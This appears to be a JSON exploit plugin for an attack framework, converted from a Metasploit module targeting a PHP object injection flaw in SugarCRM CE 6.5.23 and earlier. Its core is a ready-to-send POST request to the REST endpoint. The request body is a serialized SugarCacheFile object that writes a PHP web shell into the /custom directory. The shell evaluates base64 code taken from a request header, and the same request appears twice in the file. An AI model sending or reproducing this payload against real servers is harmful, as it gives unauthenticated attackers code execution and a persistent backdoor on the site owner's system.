{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23\n\n        which could be abused to allow unauthenticated users to execute arbitrary PHP code with\n\n        the permissions of the webserver. The dangerous unserialize() call exists in the\n\n        '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()\n\n        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.\n\n      ",
   "platform" : "UNIX",
   "type" : "MSF",
   "title" : "SugarCRM REST Unserialize PHP Code Execution",
   "references" : [
      "http://karmainsecurity.com/KIS-2016-07",
      "http://www.sugarcrm.com/security/sugarcrm-sa-2016-001",
      "http://www.sugarcrm.com/security/sugarcrm-sa-2016-008",
      "https://bugs.php.net/bug.php?id=72663"
   ],
   "msf_module" : "sugarcrm_rest_unserialize_exec",
   "name" : "SugarcrmRestUnserializeExec",
   "informations" : {
      "TITLE" : "SugarCRM REST Unserialize PHP Code Execution",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PATH" : "service/v4/rest.php",
            "METHOD" : "POST",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "method=login&input_type=Serialize&rest_data=O%3a%2b14%3a%22SugarCacheFile%22%3a23%3a%7bS%3a17%3a%22\\00%2a\\00_cacheFileName%22%3bs%3a24%3a%22../custom/noFMXgEhWX.php%22%3bS%3a16%3a%22\\00%2a\\00_cacheChanged%22%3bb%3a1%3bS%3a14%3a%22\\00%2a\\00_localStore%22%3ba%3a1%3a%7bi%3a0%3bs%3a55%3a%22%3c%3fphp%20eval%28base64_decode%28%24_SERVER%5b%27HTTP_PAYLOAD%27%5d%29%29%3b%20%3f%3e%22%3b%7d%7d",
            "TEXT" : "Sending Exploit #2 Request : [POST] /service/v4/rest.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "name" : "SugarcrmRestUnserializeExec",
      "DESCRIPTION" : "\n\n        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23\n\n        which could be abused to allow unauthenticated users to execute arbitrary PHP code with\n\n        the permissions of the webserver. The dangerous unserialize() call exists in the\n\n        '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()\n\n        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.\n\n      ",
      "MSF_MODULE" : "sugarcrm_rest_unserialize_exec",
      "REFERENCES" : [
         "http://karmainsecurity.com/KIS-2016-07",
         "http://www.sugarcrm.com/security/sugarcrm-sa-2016-001",
         "http://www.sugarcrm.com/security/sugarcrm-sa-2016-008",
         "https://bugs.php.net/bug.php?id=72663"
      ],
      "PLATFORM" : "UNIX",
      "TYPE" : "MSF"
   },
   "detection" : {},
   "requests" : {
      "EXPLOIT2" : {
         "PATH" : "service/v4/rest.php",
         "METHOD" : "POST",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "method=login&input_type=Serialize&rest_data=O%3a%2b14%3a%22SugarCacheFile%22%3a23%3a%7bS%3a17%3a%22\\00%2a\\00_cacheFileName%22%3bs%3a24%3a%22../custom/noFMXgEhWX.php%22%3bS%3a16%3a%22\\00%2a\\00_cacheChanged%22%3bb%3a1%3bS%3a14%3a%22\\00%2a\\00_localStore%22%3ba%3a1%3a%7bi%3a0%3bs%3a55%3a%22%3c%3fphp%20eval%28base64_decode%28%24_SERVER%5b%27HTTP_PAYLOAD%27%5d%29%29%3b%20%3f%3e%22%3b%7d%7d",
         "TEXT" : "Sending Exploit #2 Request : [POST] /service/v4/rest.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   }
}
